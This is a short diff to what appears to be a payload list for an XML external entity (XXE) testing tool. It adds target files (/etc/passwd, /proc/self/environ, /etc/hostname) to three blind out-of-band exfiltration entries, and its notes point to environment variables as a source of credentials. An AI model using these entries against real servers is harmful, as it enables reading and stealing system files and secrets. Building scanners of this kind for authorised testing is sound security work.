@@ -112,6 +112,7 @@
   category: oob_blind-unix
   template: oob_blind
   uri: "{OOB_URL}"
+  local_file: "/etc/passwd"
   content_type: "application/xml"
   notes: "Blind OOB exfiltration of /etc/passwd — requires a listener serving the secondary DTD."
 
@@ -119,6 +120,7 @@
   category: oob_blind-unix
   template: oob_blind
   uri: "{OOB_URL}"
+  local_file: "/proc/self/environ"
   content_type: "application/xml"
   notes: "Blind OOB exfiltration of /proc/self/environ; high value for credential leaks via env."
 
@@ -126,6 +128,7 @@
   category: oob_blind-unix
   template: oob_blind
   uri: "{OOB_URL}"
+  local_file: "/etc/hostname"
   content_type: "application/xml"
   notes: "Blind OOB read of /etc/hostname; small body, good for confirming the OOB chain end-to-end."
 
